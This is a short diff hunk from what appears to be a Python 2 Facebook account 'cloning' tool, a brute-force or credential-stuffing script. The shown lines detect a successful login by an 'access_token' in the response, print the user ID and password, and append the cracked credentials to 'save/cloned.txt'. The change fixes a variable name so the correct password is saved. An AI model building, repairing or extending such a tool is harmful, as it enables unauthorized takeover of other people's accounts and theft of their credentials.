@@ -327,7 +327,7 @@ def action():
                             if 'access_token' in q:
                                 print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + Pass5
                                 okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass+'\n')
+                                okb.write(k+c+user+pass5+'\n')
                                 okb.close()
                                 oks.append(c+user+Pass5)
                             else:
